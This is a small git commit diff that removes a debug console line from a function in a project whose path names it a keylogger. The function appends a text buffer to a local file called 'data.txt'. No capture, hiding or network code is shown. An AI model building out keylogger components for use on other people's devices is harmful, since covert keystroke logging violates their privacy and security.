b072f939994830296bbb1d089b40b98a44f36248
arnaldobatista <arnaldo.carpi@icloud.com>
2024-09-23 16:23:50 -0300

    commit

--- src/core/integrations/keylogger.js/functions/writeToFileAndClearBuffer.ts
+++ src/core/integrations/keylogger.js/functions/writeToFileAndClearBuffer.ts
@@ -1,7 +1,6 @@
 import { writeToFileAndClearBufferType } from './types';
 
 function writeToFileAndClearBuffer({ textBuffer, formatDate, formatTime, fs }: writeToFileAndClearBufferType): string {
-  console.log('ai dentro')
   if (textBuffer) {
     fs.appendFileSync('data.txt', textBuffer);
     return '';
